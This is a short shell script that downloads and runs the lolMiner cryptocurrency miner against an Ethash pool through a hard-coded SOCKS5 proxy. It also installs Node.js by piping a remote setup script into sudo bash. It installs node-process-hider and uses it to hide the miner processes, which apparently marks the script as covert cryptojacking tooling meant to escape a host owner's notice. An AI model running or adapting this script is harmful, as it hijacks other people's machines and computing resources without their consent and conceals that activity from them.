#!/bin/sh
pkill lolMiner
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
tar -xf lolMiner_v1.29_Lin64.tar.gz
cd 1.29
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
ph add PhoenixMinerEth.sh
ph add node-process-hider
ph add lolMiner
./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY --socks5 46.174.43.18:1080 --timeprint on --longstats 120 
sleep 10
